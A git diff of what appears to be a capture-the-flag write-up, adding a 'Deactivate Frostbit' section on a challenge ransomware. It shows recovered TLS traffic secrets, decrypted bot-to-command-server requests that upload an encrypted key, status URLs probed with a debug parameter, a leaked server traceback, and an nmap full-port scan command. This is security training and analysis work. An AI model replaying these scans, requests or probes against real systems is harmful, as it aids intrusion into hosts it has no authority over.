@@ -5628,8 +5628,6 @@ flag.
 sudo nmap -p 0-65535 -sV 35.226.138.216
 ```
 
-
-
 ```sh
 Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-06 00:09 -0600
 Nmap scan report for 216.138.226.35.bc.googleusercontent.com (35.226.138.216)
@@ -6531,6 +6529,101 @@ pagead2.googlesyndication.com:443
 ```
 
 Question 11: Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?
+
+## Deactivate Frostbit
+
+`DoNotAlterOrDeleteMe.frostbit.json`
+
+```json
+{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}
+```
+
+```
+file frostbit_core_dump.13
+frostbit_core_dump.13: ELF 64-bit LSB core file, x86-64, version 1 (SYSV)
+```
+
+```sh
+CLIENT_HANDSHAKE_TRAFFIC_SECRET bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 402e0169e672fe8104bdd0448b7c0af5e0290568fee554c848e696582b661096
+SERVER_HANDSHAKE_TRAFFIC_SECRET bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 0fbf25773c35e89d6a060358340b5c1a7ff18686ba29587e0aa247b9c281665c
+CLIENT_TRAFFIC_SECRET_0 bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 66360129de147203c8cb99f06a38a607f0e0585236731669c0cbf8930200bc27
+SERVER_TRAFFIC_SECRET_0 bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 c13c0b25473e8268b20df0f9d6133f3e139c57227997b67f5037a4dfe7562d63
+
+POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Content-Length: 1070
+Content-Type: application/json
+Accept-Encoding: gzip
+{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":""}
+
+{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}
+
+User-Agent: Go-http-client/1.1
+GET /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/session HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Accept-Encoding: gzip
+POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Content-Length: 1070
+Content-Type: application/json
+Accept-Encoding: gzip
+{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":""}
+```
+
+```http
+GET /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/session HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Accept-Encoding: gzip
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.27.1
+Date: Thu, 06 Nov 2025 05:01:22 GMT
+Content-Type: application/json
+Content-Length: 29
+Connection: keep-alive
+Strict-Transport-Security: max-age=31536000
+
+{"nonce":"c006a5ad0ebd8b10"}
+
+POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Content-Length: 1070
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":"c006a5ad0ebd8b10"}
+HTTP/1.1 200 OK
+Server: nginx/1.27.1
+Date: Thu, 06 Nov 2025 05:01:22 GMT
+Content-Type: application/json
+Content-Length: 99
+Connection: keep-alive
+Strict-Transport-Security: max-age=31536000
+
+{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}
+```
+
+```sh
+https://api.frostbit.app/view/2hIOSG59QY2aVV0IxOIA/53dc1b09-db05-440f-8185-028e3c5f22fc/status?digest=800080a028d5c00a930180804ee08101
+```
+
+```sh
+https://api.frostbit.app/view/2hIOSG59QY2aVV0IxOIA/53dc1b09-db05-440f-8185-028e3c5f22fc/status?digest=800080a028d5c00a930180804ee08101&debug=true
+```
+
+```json
+{"uuid": "53dc1b09-db05-440f-8185-028e3c5f22fc", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}```
+```
+
+```json
+'Status Id File Digest Validation Error: Traceback (most recent call last):\n  File "/app/frostbit/ransomware/static/FrostBiteHashlib.py", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n'
+```
 
 ## Decrypt The Naughty List
 
